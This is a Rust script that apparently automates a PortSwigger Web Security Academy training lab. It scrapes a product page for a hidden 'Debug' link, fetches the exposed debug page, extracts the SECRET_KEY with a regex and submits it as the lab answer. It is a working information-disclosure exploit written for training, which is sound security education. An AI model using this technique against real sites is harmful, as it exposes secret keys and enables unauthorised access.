/**************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 2/9/2023
*
* PortSwigger LAB: Information disclosure on debug page
*
* Steps: 1. Check the source code of a product page
*        2. GET the href of the commented a tag named "Debug"
*        3. Extract the secret key
*        4. submit the answer
*
***************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    error::Error,
    io,
    io::Write,
    process,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let start_time = time::Instant::now();
    let url = "https://0a1e00a7047eb65480bec6ee002e009f.web-security-academy.net"; // change this to your lab URL
    let client = build_client(); // build the client used in all subsequent requests

    println!(
        "{} {}",
        "1. Checking the source code..".white(),
        "OK".green()
    );
    let product_req = client.get(format!("{url}/product?productId=4")).send(); // check the source code of a product page
    if let Ok(res) = product_req {
        // if response is OK
        let body = res.text().unwrap(); // get the body of the response
        let debug_path = capture_pattern("href=(.*)>Debug", &body); // extract the debug path; change this if it is changed in your case
        if let Some(text) = debug_path {
            // if the href is found
            println!(
                "{} {} => {}",
                "2. Extracting the debug path..".white(),
                "OK".green(),
                text.yellow()
            );
            let debug_page = client.get(format!("{url}{text}")).send(); // fetch the debug page
            if let Ok(res) = debug_page {
                // if fetching is OK
                println!(
                    "{} {}",
                    "3. Fetching the debug page..".white(),
                    "OK".green()
                );
                let body = res.text().unwrap(); // get the body of the debug page
                let secret_pattern = capture_pattern("SECRET_KEY.*class=\"v\">(.*) <", &body); // extract the secret key
                if let Some(text) = secret_pattern {
                    // if the key is found
                    println!(
                        "{} {} => {}",
                        "4. Extracting the secret key..".white(),
                        "OK".green(),
                        text.yellow()
                    );
                    let submit_answer = client
                        .post(format!("{url}/submitSolution"))
                        .form(&HashMap::from([("answer", text)]))
                        .send(); // submit the answer
                    if let Ok(res) = submit_answer {
                        println!("{} {}", "5. Submitting the answer..".white(), "OK".green())
                    } else {
                        println!("{}", "[!] Failed to submit the answer".red())
                    }
                } else {
                    println!("{}", "[!] No secret key was found".red())
                }
            }
        } else {
            println!("{}", "[!] No debug path names was found".red())
        }
    }
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
